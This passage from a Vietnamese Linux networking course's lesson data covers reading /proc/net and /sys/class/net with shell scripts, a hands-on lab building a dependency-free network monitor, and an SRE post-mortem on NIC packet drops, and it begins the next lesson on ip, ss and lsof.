          codeExamples: [
            {
              title: "Giải mã /proc/net/tcp bằng Shell Script không cần cài thêm công cụ",
              lang: "Bash",
              code: "# Đọc tệp /proc/net/tcp và giải mã Hex sang định dạng IP:Port có thể đọc được\nawk 'NR>1 { split($2, loc, \":\"); split($3, rem, \":\");\n  # Chuyển Hex Little-Endian sang IP thập phân\n  loc_ip = sprintf(\"%d.%d.%d.%d\", \"0x\" substr(loc[1],7,2), \"0x\" substr(loc[1],5,2), \"0x\" substr(loc[1],3,2), \"0x\" substr(loc[1],1,2));\n  loc_port = sprintf(\"%d\", \"0x\" loc[2]);\n  # Giải mã trạng thái TCP\n  state = ($4 == \"0A\") ? \"LISTEN\" : ($4 == \"01\") ? \"ESTABLISHED\" : $4;\n  printf(\"Local: %-15s:%-5s | State: %-11s | Inode: %s\\n\", loc_ip, loc_port, state, $10);\n}' /proc/net/tcp",
              output: "Local: 0.0.0.0        :22    | State: LISTEN      | Inode: 21045\nLocal: 127.0.0.1      :53    | State: LISTEN      | Inode: 18924\nLocal: 127.0.0.1      :8080  | State: LISTEN      | Inode: 312048\nLocal: 192.168.1.105  :54320 | State: ESTABLISHED | Inode: 345102",
              annotations: [
                { line: 1, text: "Lệnh awk xử lý từng dòng dữ liệu từ dòng số 2 (NR>1) để bỏ qua hàng tiêu đề." },
                { line: 3, text: "substr cắt từng cặp 2 ký tự Hex theo thứ tự đảo ngược 4-3-2-1 để hóa giải quy tắc Little-Endian." },
                { line: 6, text: "Chuyển mã Hex 0A thành LISTEN, 01 thành ESTABLISHED." },
                { line: 7, text: "In ra bảng kết quả đẹp mắt gồm IP, Port, Trạng thái và số Inode tương ứng." }
              ]
            },
            {
              title: "Kiểm tra toàn diện thông số vật lý card mạng qua /sys/class/net/",
              lang: "Bash",
              code: "# Duyệt qua các tệp thuộc tính phần cứng của card mạng eth0\nIFACE=\"eth0\"\necho \"=== THÔNG SỐ VẬT LÝ CỦA CARD MẠNG $IFACE ===\"\nfor attr in operstate carrier speed duplex mtu address; do\n  val=$(cat /sys/class/net/$IFACE/$attr 2>/dev/null || echo \"N/A\")\n  printf \"%-12s : %s\\n\" \"$attr\" \"$val\"\ndone",
              output: "=== THÔNG SỐ VẬT LÝ CỦA CARD MẠNG eth0 ===\noperstate    : up\ncarrier      : 1\nspeed        : 1000\nduplex       : full\nmtu          : 1500\naddress      : 52:54:00:8a:bc:11",
              annotations: [
                { line: 4, text: "Vòng lặp for đọc lần lượt 6 tệp thuộc tính cơ bản trong thư mục /sys/class/net/eth0/." },
                { line: 7, text: "carrier: 1 xác nhận cáp mạng vật lý đang kết nối hoàn hảo." },
                { line: 8, text: "speed: 1000 cho biết cổng mạng hoạt động ở tốc độ 1 Gbps." },
                { line: 9, text: "duplex: full đảm bảo kênh truyền nhận hai chiều độc lập, không xảy ra xung đột." }
              ]
            },
            {
              title: "Đo tốc độ mạng thời gian thực (Real-time Bandwidth) từ /proc/net/dev",
              lang: "Bash",
              code: "# Lấy mẫu lưu lượng byte nhận (Rx) và gửi (Tx) sau mỗi 1 giây\nIFACE=\"eth0\"\nRX1=$(grep \"$IFACE:\" /proc/net/dev | awk '{print $2}')\nTX1=$(grep \"$IFACE:\" /proc/net/dev | awk '{print $10}')\nsleep 1\nRX2=$(grep \"$IFACE:\" /proc/net/dev | awk '{print $2}')\nTX2=$(grep \"$IFACE:\" /proc/net/dev | awk '{print $10}')\n\nRX_RATE=$(( (RX2 - RX1) / 1024 ))\nTX_RATE=$(( (TX2 - TX1) / 1024 ))\necho \"$IFACE Tốc độ hiện tại -> Tải về: ${RX_RATE} KB/s | Tải lên: ${TX_RATE} KB/s\"",
              output: "eth0 Tốc độ hiện tại -> Tải về: 245 KB/s | Tải lên: 38 KB/s",
              annotations: [
                { line: 3, text: "Đọc cột thứ 2 (rx_bytes) của giao diện eth0 tại thời điểm t1." },
                { line: 4, text: "Đọc cột thứ 10 (tx_bytes) tại thời điểm t1." },
                { line: 5, text: "Tạm dừng đúng 1 giây bằng lệnh sleep." },
                { line: 8, text: "Lấy hiệu số byte nhận được chia cho 1024 để tính ra tốc độ truyền tải KB/giây!" }
              ]
            }
          ]
        },
        {
          id: "sec-lab",
          title: "Phòng Lab thực hành: Xây dựng Bộ Giám Sát Mạng Độc Lập (Zero-Dependency)",
          content: `<div class="net-topo-box">
          <div class="net-topo-title">🧪 PHÒNG LAB THỰC HÀNH 0.3: XÂY DỰNG BỘ GIÁM SÁT MẠNG TỰ CHẾ</div>
          <p><strong>Mục tiêu:</strong> Tự tay chứng minh tính sống động của hai hệ thống tệp ảo <code>/proc</code> và <code>/sys</code> bằng cách tạo cổng dịch vụ, giải mã Hex thô, quan sát bộ đếm tăng lên theo từng gói tin, và viết một công cụ giám sát mạng hoàn toàn độc lập (Zero-Dependency) chạy được trên mọi container.</p>
          <p><strong>Yêu cầu môi trường:</strong> Mọi máy Linux (Ubuntu/Debian/CentOS hoặc WSL2/Docker container).</p>
        </div>

        <div class="net-step-card">
          <div class="net-step-header">
            <span class="net-step-badge">BƯỚC 1</span>
            <h4 class="net-step-title">Khảo sát thực địa hai cây thư mục ảo /proc/net và /sys/class/net</h4>
          </div>
          <p class="net-step-desc">Khám phá cấu trúc của hai hệ thống tệp ảo để nắm rõ danh sách các tệp trạng thái và tên các card mạng trên máy tính của bạn:</p>
          <pre class="code-pre"><code># Liệt kê các bảng trạng thái mạng có sẵn trong /proc/net
ls -l /proc/net | head -n 12

# Liệt kê danh sách các card mạng có trên máy qua /sys/class/net
ls -l /sys/class/net</code></pre>
          <div class="net-verify-box">
            <span class="net-verify-icon">✓</span>
            <span><strong>Cách kiểm tra bạn làm đúng:</strong> Bạn sẽ thấy <code>/proc/net</code> là một symlink trỏ tới <code>self/net</code>. Trong <code>/sys/class/net</code>, bạn sẽ thấy tối thiểu giao diện loopback <code>lo</code> và một card mạng chính (như <code>eth0</code> hoặc <code>enp0s3</code>).</span>
          </div>
        </div>

        <div class="net-step-card">
          <div class="net-step-header">
            <span class="net-step-badge">BƯỚC 2</span>
            <h4 class="net-step-title">Khởi tạo Socket lắng nghe mẫu trên cổng 8888</h4>
          </div>
          <p class="net-step-desc">Khởi chạy một tiến trình máy chủ Python lắng nghe trên cổng <code>8888</code> ở chế độ nền (background) và lưu lại mã PID:</p>
          <pre class="code-pre"><code>python3 -m http.server 8888 > /dev/null 2>&1 &
LAB_PID=$!
echo "Server đang chạy với PID: $LAB_PID"</code></pre>
          <div class="net-verify-box">
            <span class="net-verify-icon">✓</span>
            <span><strong>Cách kiểm tra bạn làm đúng:</strong> Biến <code>$LAB_PID</code> in ra một con số nguyên dương. Cổng 8888 trong hệ thập lục phân là: <code>8888 = 0x22B8</code>. Hãy ghi nhớ mã hex <code>22B8</code> này!</span>
          </div>
        </div>

        <div class="net-step-card">
          <div class="net-step-header">
            <span class="net-step-badge">BƯỚC 3</span>
            <h4 class="net-step-title">Truy tìm và Giải phẫu dòng Hex tương ứng trong /proc/net/tcp</h4>
          </div>
          <p class="net-step-desc">Dùng lệnh <code>grep</code> lọc trực tiếp mã cổng Hex <code>:22B8</code> trong tệp <code>/proc/net/tcp</code> để chứng minh Kernel đã ghi nhận kết nối:</p>
          <pre class="code-pre"><code>grep ":22B8" /proc/net/tcp</code></pre>
          <p class="net-step-desc" style="margin-top:8px;">Bây giờ hãy đối chiếu số Inode ở cột cuối cùng của dòng grep vừa tìm được với bảng File Descriptor của chính tiến trình Python:</p>
          <pre class="code-pre"><code>ls -l /proc/$LAB_PID/fd | grep socket</code></pre>
          <div class="net-verify-box">
            <span class="net-verify-icon">✓</span>
            <span><strong>Phát hiện bản chất cốt lõi:</strong> Số Inode trong <code>/proc/net/tcp</code> và số Inode trong <code>socket:[XXXXXX]</code> của <code>/proc/$LAB_PID/fd/3</code> khớp nhau 100%! Trạng thái <code>st</code> của dòng này là <code>0A</code> (TCP_LISTEN).</span>
          </div>
        </div>

        <div class="net-step-card">
          <div class="net-step-header">
            <span class="net-step-badge">BƯỚC 4</span>
            <h4 class="net-step-title">Quan sát Bộ đếm Thống kê rx_bytes Tăng theo Thời gian thực</h4>
          </div>
          <p class="net-step-desc">Giao diện loopback <code>lo</code> được sử dụng khi gửi dữ liệu nội bộ. Hãy kiểm tra số byte hiện tại của <code>lo</code>, sau đó gửi một yêu cầu HTTP tải dữ liệu và quan sát con số biến thiên:</p>
          <pre class="code-pre"><code># Đọc số byte nhận trước khi gửi request
BEFORE=$(cat /sys/class/net/lo/statistics/rx_bytes)
echo "Byte nhận trước đó: $BEFORE"

# Bắn 5 yêu cầu HTTP tải trang chủ cổng 8888
for i in {1..5}; do curl -s http://127.0.0.1:8888 > /dev/null; done

# Đọc lại số byte nhận sau khi tải dữ liệu
AFTER=$(cat /sys/class/net/lo/statistics/rx_bytes)
echo "Byte nhận sau đó  : $AFTER"
echo "Tổng byte đã tăng : $((AFTER - BEFORE)) bytes"</code></pre>
          <div class="net-verify-box">
            <span class="net-verify-icon">✓</span>
            <span><strong>Hiện tượng quan sát:</strong> Biến <code>AFTER</code> lớn hơn <code>BEFORE</code> rõ rệt. Mỗi byte dữ liệu mạng chạy qua card mạng đều lập tức được vi mạch/driver cộng thẳng vào bộ đếm phần cứng trong sysfs!</span>
          </div>
        </div>

        <div class="net-step-card">
          <div class="net-step-header">
            <span class="net-step-badge">BƯỚC 5</span>
            <h4 class="net-step-title">Xây dựng Script Giám Sát Độc Lập kernel_netwatch.sh</h4>
          </div>
          <p class="net-step-desc">Tạo một file script Bash mini mang tên <code>kernel_netwatch.sh</code>. Script này hoàn toàn không dùng <code>netstat</code>, <code>ss</code>, <code>ip</code>, hay bất kỳ phần mềm cài thêm nào:</p>
          <pre class="code-pre"><code>cat &lt;&lt; 'EOF' &gt; kernel_netwatch.sh
#!/bin/bash
echo "=========================================================="
echo "      BỘ GIÁM SÁT MẠNG KERNEL ZERO-DEPENDENCY"
echo "=========================================================="

echo "[1] CÁC CỔNG TCP ĐANG LẮNG NGHE (TỪ /proc/net/tcp):"
printf "%-18s %-8s %-12s %s\n" "LOCAL IP" "PORT" "STATE" "INODE"
awk 'NR>1 && $4=="0A" {
  split($2, a, ":");
  ip = sprintf("%d.%d.%d.%d", "0x" substr(a[1],7,2), "0x" substr(a[1],5,2), "0x" substr(a[1],3,2), "0x" substr(a[1],1,2));
  port = sprintf("%d", "0x" a[2]);
  printf "%-18s %-8s %-12s %s\n", ip, port, "LISTEN", $10;
}' /proc/net/tcp

echo -e "\n[2] SỨC KHỎE CARD MẠNG (TỪ /sys/class/net):"
for iface in /sys/class/net/*; do
  name=$(basename $iface)
  state=$(cat $iface/operstate 2>/dev/null)
  carrier=$(cat $iface/carrier 2>/dev/null || echo "N/A")
  drops=$(cat $iface/statistics/rx_dropped 2>/dev/null || echo "0")
  printf "Card: %-10s | Trạng thái: %-6s | Cáp vật lý: %-3s | Gói rụng (Drops): %s\n" "$name" "$state" "$carrier" "$drops"
done
EOF

chmod +x kernel_netwatch.sh
./kernel_netwatch.sh
kill -9 $LAB_PID 2>/dev/null</code></pre>
          <div class="net-verify-box">
            <span class="net-verify-icon">✓</span>
            <span><strong>Chiến thắng kỹ thuật:</strong> Bạn vừa tự tay tạo ra một công cụ giám sát mạng hoạt động trơn tru trên bất kỳ container tối giản nào mà không cần cài đặt thêm một byte thư viện nào từ bên ngoài!</span>
          </div>
        </div>`
        },
        {
          id: "sec-production",
          title: "Môi trường Production & Ca sự cố: Bệnh án 'Packet Drop Bí Ẩn' tại Cụm Máy Chủ 10Gbps",
          content: `<div class="net-postmortem-card">
          <div class="net-postmortem-header">
            <span class="net-postmortem-badge">SRE POST-MORTEM</span>
            <span class="net-postmortem-title">Hồ Sơ Sự Cố: Gói Tin Rụng Hàng Loạt Dù CPU 35% Trên Cụm Database 10Gbps</span>
          </div>
          <div class="net-postmortem-body">
            <p><strong>🚨 Bối cảnh sự cố:</strong> Một hệ thống cơ sở dữ liệu phân tán (Distributed Database Cluster) phục vụ giao dịch tài chính với hạ tầng mạng quang 10Gbps (NIC Intel 82599ES 10-Gigabit SFI/SFP+). Trong đợt chốt sổ giao dịch cuối ngày, hệ thống bắt đầu xuất hiện triệu chứng bất thường:</p>
            <ul>
              <li>Độ trễ truy vấn P99 (99th percentile latency) vọt từ <strong>2 mili-giây lên 950 mili-giây</strong>.</li>
              <li>Hàng loạt microservice báo lỗi: <code>Connection timed out while waiting for query response</code>.</li>
              <li>Đội ngũ trực ban (On-call) kiểm tra máy chủ Database qua lệnh <code>top</code> thì thấy mức tiêu thụ CPU tổng chỉ ở mức <strong>35%</strong>, RAM còn dư tới <strong>64 GB</strong>, và băng thông mạng mới đạt <strong>4.2 Gbps</strong> (chưa tới 50% công suất đường truyền).</li>
            </ul>

            <p style="margin-top:12px;"><strong>💥 Triệu chứng bắt nguồn từ cửa sổ Kernel /sys/class/net:</strong></p>
            <p>Một kỹ sư SRE kỳ cựu đã kiểm tra trực tiếp kho dữ liệu thống kê của card mạng quang <code>eth0</code>:</p>
            <div class="net-log-terminal"># Kiểm tra số gói tin bị rụng (rx_dropped) và lỗi bộ đệm phần cứng (rx_fifo_errors)
$ cat /sys/class/net/eth0/statistics/rx_dropped
1482094
$ cat /sys/class/net/eth0/statistics/rx_fifo_errors
1482094</div>
            <p>Con số <code>rx_dropped</code> và <code>rx_fifo_errors</code> tăng vọt với tốc độ kinh hoàng: <strong>hơn 25.000 gói tin bị vứt bỏ mỗi giây!</strong></p>

            <p><strong>🔍 Phân tích nguyên nhân gốc rễ (Root Cause Analysis):</strong></p>
            <ol>
              <li><strong>Kích thước Ring Buffer mặc định quá nhỏ:</strong> Card mạng được xuất xưởng với kích thước bộ đệm nhận phần cứng (Rx Ring Buffer) mặc định chỉ là <strong>512 descriptors</strong>. Khi gặp các đợt bùng nổ giao dịch nhỏ (micro-burst traffic diễn ra trong vài mili-giây), 512 ô nhớ DMA này bị lấp đầy chỉ trong tích tắc, dẫn đến chip mạng không còn chỗ chứa và phải vứt bỏ toàn bộ gói tin tiếp theo (gây tăng <code>rx_fifo_errors</code>).</li>
              <li><strong>Nghẽn cổ chai CPU ngắt đơn luồng (IRQ Core Affinity Imbalance):</strong> Mặc dù CPU tổng thể chỉ đạt 35%, nhưng khi kỹ sư bấm phím <code>1</code> trong <code>top</code> để xem từng core riêng lẻ, họ phát hiện ra sự thật kinh hoàng:
                <br><strong>CPU Core 0 phải gánh 100% thời gian xử lý SoftIRQ (cột <code>%si</code> đạt 100%)</strong>, trong khi 15 core CPU còn lại đang hoàn toàn nhàn rỗi (0% <code>%si</code>)!
                <br>Lý do: Ngắt phần cứng (Hardware IRQ) của card mạng bị gán cứng vào CPU 0, khiến CPU 0 bị bão hòa hoàn toàn và không kịp nhấc các gói tin ra khỏi Ring Buffer của card mạng.</li>
            </ol>

            <p style="margin-top:14px;"><strong>💊 Phác đồ điều trị triệt để của Kiến trúc sư Mạng &amp; SRE:</strong></p>
            <ol class="net-treatment-list">
              <li>
                <strong>Mở rộng kích thước bộ đệm phần cứng Ring Buffer lên kịch kim:</strong>
                <p style="margin:4px 0;font-size:0.86rem;">Kiểm tra giới hạn tối đa mà phần cứng hỗ trợ bằng lệnh <code>ethtool -g eth0</code>, sau đó nâng kích thước Rx/Tx descriptors từ 512 lên 4096:</p>
                <pre class="code-pre" style="margin:6px 0;"><code>sudo ethtool -G eth0 rx 4096 tx 4096</code></pre>
              </li>
              <li>
                <strong>Kích hoạt Receive Packet Steering (RPS) trực tiếp qua /sys/class/net:</strong>
                <p style="margin:4px 0;font-size:0.86rem;">RPS cho phép phân phối việc xử lý gói tin của một hàng đợi mạng cho toàn bộ các nhân CPU trong hệ thống. Ghi mặt nạ bitmask <code>ffff</code> (đại diện cho cả 16 core CPU) vào tệp điều khiển RPS của hàng đợi nhận <code>rx-0</code>:</p>
                <pre class="code-pre" style="margin:6px 0;"><code>echo "ffff" | sudo tee /sys/class/net/eth0/queues/rx-0/rps_cpus</code></pre>
              </li>
              <li>
                <strong>Cân bằng ngắt phần cứng tự động với Daemon irqbalance:</strong>
                <pre class="code-pre" style="margin:6px 0;"><code>sudo systemctl enable --now irqbalance</code></pre>
              </li>
            </ol>
            <p style="margin-top:10px;">Ngay sau khi áp dụng 3 bước trên, tỷ lệ <code>%si</code> giảm đều xuống dưới 8% trên tất cả 16 core CPU, bộ đếm <code>rx_dropped</code> dừng tăng ngay lập tức, và độ trễ P99 của cụm cơ sở dữ liệu quay về mức lý tưởng 2ms!</p>
          </div>
        </div>`
        }
      ],
      callouts: {
        pitfalls: [
          {
            title: "Bẫy thứ tự Byte (Byte Ordering): Nhầm lẫn Little-Endian trong /proc/net/tcp",
            content: "Nhiều người lập trình công cụ giám sát mạng lần đầu khi đọc trường <code>local_address</code> thấy chuỗi <code>0100A8C0</code> đã vội vàng dịch trực tiếp thành IP <code>1.0.168.192</code>. Đây là sai lầm chết người! Do kiến trúc x86 lưu theo Little-Endian, bạn phải đảo ngược thứ tự các cặp byte thành <code>C0 . A8 . 00 . 01</code>, kết quả chính xác phải là địa chỉ mạng riêng <code>192.168.0.1</code>."
          },
          {
            title: "Bẫy hiệu năng khi đọc /proc/net/tcp trên máy chủ cực lớn (Lock Contention)",
            content: "Trên các máy chủ High-Concurrency đang gánh hơn 200.000 kết nối TCP đồng thời, việc chạy lệnh <code>cat /proc/net/tcp</code> hoặc gọi các công cụ cũ như <code>netstat</code> sẽ khiến Kernel phải duyệt tuần tự qua toàn bộ bảng băm socket và giữ ổ khóa đồng bộ (Lock). Điều này có thể khiến hệ điều hành bị đơ hoặc khựng (latency spike) trong vài trăm mili-giây. Đây chính là lý do vì sao công cụ hiện đại <code>ss</code> đã chuyển sang sử dụng cơ chế Netlink Socket thay vì đọc file ảo procfs."
          }
        ],
        tips: [
          {
            title: "Mẹo chẩn đoán đứt cáp vật lý tức thời: Đọc /sys/class/net/<iface>/carrier",
            content: "Khi một máy chủ bị mất mạng, thay vì mất hàng chục giây chạy lệnh <code>ping</code> hay <code>traceroute</code> rồi ngồi chờ thông báo timeout, hãy gõ ngay: <code>cat /sys/class/net/eth0/carrier</code>. Nếu trả về số <code>0</code>, bạn biết chắc chắn 100% nguyên nhân là cáp mạng bị tuột hoặc cổng switch phía đối diện đã bị shutdown, không cần tốn thời gian kiểm tra cấu hình phần mềm!"
          },
          {
            title: "Ảnh chụp X-quang siêu tốc toàn hệ điều hành với /proc/net/sockstat",
            content: "Muốn biết toàn hệ thống đang mở bao nhiêu socket TCP, bao nhiêu socket ở trạng thái TIME_WAIT và bộ nhớ RAM mà socket đang chiếm dụng là bao nhiêu? Hãy đọc tệp <code>/proc/net/sockstat</code>. Kernel trả về các con số tổng hợp trong chớp mắt mà không làm tốn CPU hay lock bảng socket."
          }
        ]
      },
      exercises: [
        {
          level: "Dễ",
          title: "Lấy thông số Card mạng vật lý không dùng ip/ifconfig/ethtool",
          problem: "Hãy viết một câu lệnh Bash shell kết hợp vòng lặp để in ra Tốc độ (Speed), Trạng thái cáp mạng (Carrier) và Kích thước MTU của card mạng `eth0` thuần túy bằng cách đọc thư mục `/sys/class/net/eth0/`.",
          hint: "Sử dụng vòng lặp `for f in speed carrier mtu; do ... done` và lệnh `cat`.",
          solutionCode: "for f in speed carrier mtu; do\n  echo \"$f: $(cat /sys/class/net/eth0/$f 2>/dev/null)\"\ndone",
          solutionOutput: "speed: 1000\ncarrier: 1\nmtu: 1500",
          explanation: "Thư mục `/sys/class/net/eth0/` chứa các tệp văn bản nhỏ tương ứng với từng thuộc tính phần cứng của interface. Đọc trực tiếp các tệp này không đòi hỏi quyền root và không phụ thuộc vào bất kỳ gói phần mềm nào cài thêm."
        },
        {
          level: "Vừa",
          title: "Thống kê số lượng Socket theo trạng thái TCP bằng awk trên /proc/net/tcp",
          problem: "Viết một câu lệnh one-liner bằng `awk` đọc tệp `/proc/net/tcp` để đếm tổng số lượng socket đang ở trạng thái LISTEN (mã hex 0A) và số lượng socket đang ở trạng thái ESTABLISHED (mã hex 01) trên toàn hệ thống.",
          hint: "Sử dụng cột thứ 4 ($4) của `/proc/net/tcp`, dùng biến đếm mảng kết hợp `count[$4]++` và in kết quả ở khối END.",
          solutionCode: "awk 'NR>1 { count[$4]++ }\nEND {\n  printf(\"LISTEN (0A)     : %d\\n\", count[\"0A\"]);\n  printf(\"ESTABLISHED (01): %d\\n\", count[\"01\"]);\n}' /proc/net/tcp",
          solutionOutput: "LISTEN (0A)     : 14\nESTABLISHED (01): 8",
          explanation: "Tệp `/proc/net/tcp` chứa mã trạng thái kết nối TCP ở cột thứ 4 ($4). Lệnh `awk` duyệt qua tất cả các dòng dữ liệu (bỏ qua dòng tiêu đề NR>1) và gom nhóm đếm tần suất xuất hiện của mã trạng thái hex 0A (TCP_LISTEN) và 01 (TCP_ESTABLISHED)."
        },
        {
          level: "Thử thách",
          title: "Viết công cụ đo thông lượng mạng thời gian thực (Zero-Dependency Monitor)",
          problem: "Viết một script Shell hoàn chỉnh nhận tên giao diện mạng làm tham số đầu vào (ví dụ `./monitor.sh eth0`), đọc dữ liệu từ `/sys/class/net/<iface>/statistics/`, và liên tục in ra tốc độ truyền nhận (KB/s) cùng số gói bị rụng (drops) sau mỗi giây cho đến khi người dùng nhấn Ctrl+C.",
          hint: "Lưu giá trị `rx_bytes` và `tx_bytes` vào biến cũ, `sleep 1`, đọc giá trị mới, tính hiệu số `(mới - cũ) / 1024`, và lặp lại trong vòng lặp `while true`.",
          solutionCode: "#!/bin/bash\nIFACE=\"${1:-eth0}\"\nSTAT_DIR=\"/sys/class/net/$IFACE/statistics\"\nif [ ! -d \"$STAT_DIR\" ]; then echo \"Card $IFACE khong ton tai!\"; exit 1; fi\n\necho \"Dang giam sat luu luong $IFACE (Nhan Ctrl+C de dung)...\"\nPREV_RX=$(cat $STAT_DIR/rx_bytes)\nPREV_TX=$(cat $STAT_DIR/tx_bytes)\n\nwhile true; do\n  sleep 1\n  CURR_RX=$(cat $STAT_DIR/rx_bytes)\n  CURR_TX=$(cat $STAT_DIR/tx_bytes)\n  DROPS=$(cat $STAT_DIR/rx_dropped)\n  \n  RATE_RX=$(( (CURR_RX - PREV_RX) / 1024 ))\n  RATE_TX=$(( (CURR_TX - PREV_TX) / 1024 ))\n  \n  printf \"[%s] Tải về: %'6d KB/s | Tải lên: %'6d KB/s | Rụng: %s\\n\" \"$(date +%T)\" $RATE_RX $RATE_TX $DROPS\n  PREV_RX=$CURR_RX\n  PREV_TX=$CURR_TX\ndone",
          solutionOutput: "[22:30:01] Tải về:    142 KB/s | Tải lên:     18 KB/s | Rụng: 0\n[22:30:02] Tải về:    315 KB/s | Tải lên:     42 KB/s | Rụng: 0\n[22:30:03] Tải về:     89 KB/s | Tải lên:     12 KB/s | Rụng: 0",
          explanation: "Bằng cách đọc trực tiếp hai bộ đếm lũy kế 64-bit `rx_bytes` và `tx_bytes` trong sysfs theo chu kỳ 1 giây, script tính toán chính xác tuyệt đối lượng byte dịch chuyển qua card mạng mà không cần dùng bất kỳ công cụ nặng nề nào như `iftop`, `nload` hay `sar`."
        }
      ],
      reflectionQuestion: "Tại sao các công cụ chẩn đoán mạng hiện đại như ss và iproute2 lại chuyển sang dùng giao thức Netlink (AF_NETLINK) thay vì tiếp tục đọc các tệp văn bản trong /proc/net như netstat và route thời xưa? Bản chất cơ chế IPC Netlink đã giải quyết những điểm nghẽn (bottlenecks) chí mạng nào của kiến trúc procfs?",
      reflectionHint: "Cơ chế đọc file văn bản trong procfs gặp 4 điểm nghẽn chí mạng khi quy mô hệ thống mở rộng:\n1. Lock Contention: Kernel phải duyệt qua toàn bộ bảng băm socket tcp_hashinfo và giữ khóa đồng bộ, gây nghẽn CPU khi có hàng trăm ngàn kết nối.\n2. Chuỗi ASCII cồng kềnh: Kernel phải tốn hàng triệu phép tính CPU để chuyển đổi số nhị phân thành chuỗi văn bản ASCII (sprintf), rồi User Space lại tốn CPU phân tích cú pháp chuỗi văn bản đó ngược lại (parsing).\n3. Bộ đệm seq_file: procfs sinh dữ liệu theo từng trang bộ nhớ 4KB, nếu bảng dữ liệu vượt quá kích thước bộ đệm, việc cấp phát và copy dữ liệu gây lãng phí bộ nhớ.\n4. Thiếu Kernel-side Filtering: Muốn tìm 1 cổng, procfs bắt buộc phải đẩy toàn bộ 200.000 dòng ra cho user space grep. Trong khi đó, Netlink là giao tiếp Socket nhị phân hai chiều: truyền tải cấu trúc C nhị phân nhỏ gọn (TLVs), hỗ trợ Kernel-side filtering (chỉ gửi đúng socket cần tìm) và không khóa cứng bảng băm mạng!",
      summary: [
        "procfs (/proc/net) công khai bảng trạng thái động của Network Stack (TCP, UDP, Socket Inodes), còn sysfs (/sys/class/net) mô hình hóa cấu trúc phân cấp phần cứng và driver Card mạng.",
        "/proc/net thực chất là Symbolic Link trỏ về /proc/self/net, đảm bảo tính cô lập hoàn hảo của Network Namespace cho từng Container.",
        "Bảng /proc/net/tcp mã hóa địa chỉ IP theo chuẩn Little-Endian của vi xử lý x86; bạn cần đảo ngược thứ tự 4 cặp byte Hex để giải mã ra địa chỉ IP người đọc được.",
        "Chỉ số rx_dropped và rx_fifo_errors trong /sys/class/net/<iface>/statistics/ là các bộ đếm tử huyệt cảnh báo tràn bộ đệm phần cứng (Ring Buffer) và nghẽn cổ chai CPU ngắt SoftIRQ.",
        "Hiểu rõ /proc và /sys giúp kỹ sư có khả năng chẩn đoán và viết công cụ giám sát mạng zero-dependency trên mọi môi trường tối giản nhất (Distroless, Alpine scratch) khi không có sẵn bất kỳ công cụ CLI nào."
      ],
      nextLessonPreview: "Bài 0.4: Bộ ba chẩn đoán Interface & Socket: ip -br a, ss -tulpn, lsof -i — Xóa bỏ công cụ cũ lỗi thời (ifconfig, netstat): Làm chủ bộ công cụ chẩn đoán socket & interface hiện đại."
    },
    {
      id: "net-0-04",
      number: "0.4",
      title: "Bộ ba chẩn đoán Interface & Socket: ip -br a, ss -tulpn, lsof -i",
      subtitle: "Xóa bỏ công cụ cũ lỗi thời (ifconfig, netstat): Làm chủ bộ công cụ chẩn đoán socket & interface hiện đại",
      level: "Nền tảng",
      duration: "90 phút",
      objectives: [
        "Hiểu rõ căn nguyên kiến trúc vì sao bộ công cụ cũ net-tools (ifconfig, netstat, route) bị khai tử và thay thế hoàn toàn bởi iproute2.",
        "Làm chủ chân kiềng thứ nhất: Sử dụng `ip -br a` và họ lệnh `ip` để kiểm tra trạng thái card mạng (UP vs LOWER_UP), địa chỉ CIDR và MTU.",
        "Làm chủ chân kiềng thứ hai: Thành thạo `ss -tulpn`, giải mã chính xác ý nghĩa trái ngược của Recv-Q và Send-Q giữa trạng thái LISTEN và ESTABLISHED.",
        "Làm chủ chân kiềng thứ ba: Sử dụng `lsof -nP -i` để truy vết chính xác từ cổng mạng tới tiến trình sở hữu (PID, Command, User, FD).",
        "Áp dụng quy tắc an toàn sống còn `-n` và `-P` (Numeric Only) để triệt tiêu nguy cơ treo terminal khi phân giải DNS gặp sự cố."
      ],
      intuition: {
        title: "Chiếc Kính Tam Tiêu: Soi Đường Dây, Bảng Trạng Thái & Thợ Săn Thủ Phạm",
        metaphor: "Hãy tưởng tượng hệ thống mạng Linux giống như một tòa cao ốc văn phòng khổng lồ với hàng ngàn đường dây liên lạc:\n1. ip -br a là chiếc bản đồ hạ tầng: Cho bạn biết ngay tòa nhà có những cổng dây nào (Interface), dây nào đã cắm cáp quang (LOWER_UP), số phòng được gán là gì (Địa chỉ IP/Subnet).\n2. ss -tulpn là bảng điều khiển tổng đài: Cho bạn thấy tất cả các cuộc gọi đang diễn ra (Socket), cổng nào đang mở sẵn sàng đón tiếp (LISTEN), cuộc gọi nào đang đàm thoại (ESTABLISHED), và hàng đợi thư thoại có bị nghẽn tắc không (Recv-Q/Send-Q).\n3. lsof -nP -i là viên thám tử tư: Khi phát hiện cổng số 8080 đang bị chiếm giữ bất thường, viên thám tử sẽ lập tức lần theo dây cáp đến tận bàn làm việc của nhân viên nào (PID), người đó tên là gì (Command), dùng quyền của ai (User) và đang cầm trên tay chiếc cắm số mấy (File Descriptor)!\nThiếu bất kỳ một trong ba chiếc kính này, bạn sẽ mãi mãi chỉ nhìn thấy một nửa bức tranh khi điều tra sự cố mạng trên Linux.",
        visualHtml: `<div class="net-arch-box">
            <div class="net-arch-header">
              <span class="net-arch-icon">📐</span>
              <span class="net-arch-title">TAM GIÁC CHẨN ĐOÁN MẠNG LINUX HIỆN ĐẠI: INTERFACE ➔ SOCKET ➔ PROCESS</span>
            </div>
            <div class="net-arch-layers">
              <div class="net-arch-layer layer-hardware">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">🌐 CHÂN KIỀNG 1: ip -br a (Tầng L1 - L3: Physical Link, Interface &amp; Routing)</span>
                  <span class="net-arch-layer-badge">iproute2 / Netlink RTM_GETADDR</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>Mục tiêu chẩn đoán:</strong> Card mạng có UP không? Cáp có cắm không? (<code>UP</code> vs <code>LOWER_UP</code>)</div>
                  <div class="net-arch-node"><strong>Thông số chủ chốt:</strong> Địa chỉ IPv4/IPv6 CIDR (ví dụ <code>192.168.1.50/24</code>), MTU, MAC Address</div>
                  <div class="net-arch-node"><strong>Cơ chế Kernel:</strong> Giao tiếp qua Netlink Socket <code>RTM_GETLINK</code> (nhanh, hỗ trợ Network Namespace)</div>
                </div>
              </div>

              <div class="net-arch-arrow">⬇️ Dữ liệu được đưa lên tầng truyền vận Transport Layer (L4)</div>

              <div class="net-arch-layer layer-netstack">
                <div class="net-arch-layer-header">
